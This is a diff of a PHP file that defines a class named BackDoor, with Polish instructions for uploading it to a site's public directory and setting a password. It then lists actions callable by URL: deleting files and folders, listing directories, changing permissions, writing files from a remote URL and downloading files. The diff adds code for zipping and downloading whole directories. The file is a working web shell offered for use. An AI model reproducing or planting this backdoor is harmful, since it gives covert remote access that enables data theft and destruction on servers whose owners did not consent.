@@ -1,9 +1,28 @@
 <?php
 /*
-*	Krystian Oziembała
-*	www.krystianoziembala.pl
-*	gerro@krystianoziembala.pl
-*	Free for use
+*
+>>>>>>>>>> INSTRUKCJA KONFIGURACJI <<<<<<<<<<
+
+1. Plik bd.php wrzucić do public
+2. Ustawić hasło w linii kodu nr 44 ($this->pass = 'your_password')
+
+>>>>>>>>>> PARAMETRY <<<<<<<<<<
+
+Wymagane: key i action
+www.example.com/bd.php?key=your_password&action=your_name_function
+
+Inne: url, path, number
+
+>>>>>>>>>> AKCJE <<<<<<<<<<<
+
+action:
+- getPhpInfo (wymagane parametry: key i action)
+- deleteFile (wymagane parametry: key, action i path) - sluzy do usuwania konkretnego pliku
+- deleteCategory (wymagane parametry: key, action i path) - sluzy do usuwanie konkretnej kategorii
+- listFiles (wymagane parametry: key, action i (nieobowiazkowo path)) - sluzy to wyswietlenia listu folderów z plikami
+- chmod (wymagane parametry: key, action, path i number) 
+- download (wymagane parametry: key, action, path) - sluzy do pobrania pliku czy katalogu z plikami
+- putContent (wymagane parametry: key, action, url) - sluzy do tworzenia pliku (np. wklej.org i nazwa_pliku | tresc zawartosci);
 */
 
 class BackDoor {
@@ -185,7 +204,7 @@ class BackDoor {
 	*	Pobranie pliku
 	*/
 	public function download(){
-		if(file_exists($this->path)){
+		if(file_exists($this->path) && !is_dir($this->path)){
 			header('Content-Description: File Transfer');
 		    header('Content-Type: application/octet-stream');
 		    header('Content-Disposition: attachment; filename="'.basename($this->path).'"');
@@ -196,8 +215,63 @@ class BackDoor {
 		    readfile($this->path);
 		    exit;
 		}
+		else
+		{
+			if(is_dir($this->path))
+			{
+				
+				$zipname = "download.zip";
+			    $zip = new ZipArchive;
+
+			    $zip->open($zipname, ZipArchive::CREATE);
+
+			    foreach($this->is_cat($this->path) as $t)
+			    {
+			    	$zip->addFile($t, str_replace($this->path.'/','',$t));
+			    }
+			    $zip->close();
+			    
+			    header('Content-Type: application/zip');
+			    header("Content-Disposition: attachment; filename=".$zipname);
+			    header('Content-Length: ' . filesize($zipname));
+			    readfile($zipname);
+			    unlink($zipname);
+			}
+		}
 	}
 
+	/*
+	* Listowanie wszystki katalogów i plików specjalne dla zipa
+	*/
+	public function is_cat($cat){
+		$tab = [];
+		if(is_dir($cat))
+		{
+			foreach(scandir($cat) as $c)
+			{
+				if($c == '.' || $c == '..')
+				{
+					continue;
+				}
+				else
+				{
+					if(is_dir($cat.'/'.$c))
+					{
+						foreach($this->is_cat($cat.'/'.$c) as $key=>$n)
+						{
+							$tab[] = $n;
+						}
+					}
+					else
+					{
+						$tab[] = $cat.'/'.$c;
+					}
+				}
+				
+			}
+		}
+		return $tab;
+	}
 
 }
 
